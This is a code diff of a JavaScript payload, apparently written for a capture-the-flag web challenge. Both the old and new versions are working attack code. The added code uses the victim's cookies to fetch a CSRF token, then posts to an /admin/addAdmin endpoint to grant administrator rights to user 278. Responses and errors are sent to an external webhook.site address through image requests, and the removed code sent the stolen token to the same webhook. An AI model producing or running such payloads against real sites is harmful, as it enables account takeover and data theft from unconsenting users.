@@ -1,20 +1,50 @@
 <script>
 (async () => {
-  const WEBHOOK = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160';
-  const FALLBACK = 'https://web1-79e4a3bc.p1.securinets.tn';
   try {
-    const base = (typeof location !== 'undefined' && location.hostname)
-      ? (location.protocol + '//' + location.hostname + (location.port ? ':' + location.port : ''))
-      : FALLBACK;
+    // Hardcoded target host (prevents resolving to github pages)
+    const base = 'https://web1-79e4a3bc.p1.securinets.tn';
 
-    const r = await fetch(base + '/csrf-token', { credentials: 'include' });
-    const status = r.status;
-    const body = await r.text();
-    // limit the size to avoid overly long URLs
-    const short = encodeURIComponent(body).slice(0, 4000);
-    new Image().src = WEBHOOK + '?tok_status=' + status + '&tok_body=' + short;
-  } catch (e) {
-    new Image().src = WEBHOOK + '?err=' + encodeURIComponent(e.message);
+    const WEBHOOK = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160';
+    const TARGET_USER_ID = 278;
+
+    // Fetch CSRF token from the actual target host
+    const tokRes = await fetch(base + '/csrf-token', { credentials: 'include' });
+
+    // If non-200, report status and first chars of body
+    if (!tokRes.ok) {
+      const body = await tokRes.text().catch(()=>'');
+      new Image().src = WEBHOOK + '?err=' + encodeURIComponent('tok_status=' + tokRes.status + ' body=' + body.slice(0,300));
+      return;
+    }
+
+    // Parse JSON and read csrfToken (per your sample)
+    let tokJson;
+    try {
+      tokJson = await tokRes.json();
+    } catch (e) {
+      const txt = await tokRes.text();
+      new Image().src = WEBHOOK + '?err=' + encodeURIComponent('csrf-not-json body=' + txt.slice(0,400));
+      return;
+    }
+
+    const csrf = tokJson.csrfToken || tokJson.csrf || tokJson._csrf || tokJson.CSRF || tokJson.token || tokJson.tokenId;
+    if (!csrf) {
+      new Image().src = WEBHOOK + '?err=' + encodeURIComponent('no-csrf-in-json ' + JSON.stringify(tokJson).slice(0,400));
+      return;
+    }
+
+    // Perform the privileged POST using the admin's cookies & the token
+    const promoteRes = await fetch(base + '/admin/addAdmin', {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json', 'CSRF-Token': csrf },
+      body: JSON.stringify({ userId: TARGET_USER_ID })
+    });
+
+    const promoteText = await promoteRes.text();
+    new Image().src = WEBHOOK + '?res=' + encodeURIComponent(promoteText);
+  } catch (err) {
+    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(err.message);
   }
 })();
 </script>
